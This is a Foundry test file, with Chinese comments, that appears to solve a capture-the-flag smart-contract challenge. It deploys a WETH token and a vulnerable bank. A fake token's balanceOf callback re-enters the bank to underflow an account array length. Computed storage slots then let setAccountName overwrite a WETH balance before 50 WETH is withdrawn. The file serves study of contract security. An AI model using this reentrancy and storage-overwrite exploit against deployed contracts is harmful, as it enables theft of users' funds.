// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "./interface.sol";
import "./setupBytecode.sol";

contract attackTest is Test {
    string constant WETH9_Artifact = 'out/helper_WETH9.sol/WETH9.json';

    IWETH9 public weth;
    ISetup public level;
    IBank public bank;
    uint256 public count01 = 0;
    uint256 public count02 = 0;
 
    function setUp() public payable{
        // 部署
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);
        vm.startBroadcast(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));

        weth = IWETH9(deployHelper_weth(WETH9_Artifact));
        level = ISetup(deployHelper_Setup(address(weth)));
        bank = IBank(level.bank());

        vm.label(address(weth),"weth");
        vm.label(address(level),"level");
        vm.label(address(bank),"bank");
        vm.stopBroadcast();
    }

    function test_isComplete() public{
        unchecked{
            // 先存入一个，之后才能够修改信息
            bank.depositToken(0, address(this), 0);

            // 一系列计算
            bytes32 myArraySlot = keccak256(abi.encode(address(this), 2)); // 找到Account[]长度的位置
            bytes32 myAccountStart = keccak256(abi.encode(myArraySlot)); // 找到第一个Account的初始位置

            // 由于可能覆盖不到，因此需要不断尝试,account是指Accounts[]中第n个account
            uint256 account_n = 0; // 第n个account
            uint256 slotsNeed = 0; // 需要的距离
            while (true) {
                bytes32 accountStart = bytes32(uint(myAccountStart) + 3*account_n); // 找到第n个account的开始位置
                bytes32 accountBalances = bytes32(uint(accountStart) + 2); // 找到`mapping(address => uint) balances`的位置
                bytes32 wethBalance = keccak256(abi.encode(address(weth), accountBalances)); // 找到我们的WETH将会存在的位置

                slotsNeed = uint256(wethBalance) - uint256(myAccountStart);
                if (slotsNeed % 3 == 0) { // 刚好可以覆盖到
                    break;
                }
                // 如果第n个account的位置覆盖不到，则试下一个account
                account_n++;
            }

            // 找到要修改的Account的位置
            uint256 accountId = slotsNeed / 3;

            // 找到了第accountId个Account结构体大小位置
            bank.setAccountName(accountId, "any value");
            // 因为第account_n个account的WETH余额位置刚好可以覆盖，因此我们操作这个account
            bank.withdrawToken(account_n, address(weth), 50 ether);
        }
        assertEq(level.isSolved(), true);
    }

    function transferFrom(address, address, uint256) public returns(bool){
        return true;
    }

    function transfer(address, uint256) public returns(bool){
        return true;
    }

    function balanceOf(address) public returns(uint256){
       if(count01 == 0){
            count01++;
            return 0;
       }else if(count01 == 1){
            count01++;
            bank.withdrawToken(0, address(this), 0);
            return 0;
       }else if(count01 == 2){
            count01++;
            bank.depositToken(0, address(this), 0);
            return 0;
       }else if(count01 == 3){
            count01++;
            bank.withdrawToken(0, address(this), 0);
            return 0;
       }else{
            return 0;
       }
        
    }

    function deployHelper_weth(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }
    function deployHelper_Setup(address _addr) public payable returns (address addr) {
        bytes memory bytecode = BYTECODE;
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(address(_addr)));
        assembly {
            addr := create(50000000000000000000, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }

}

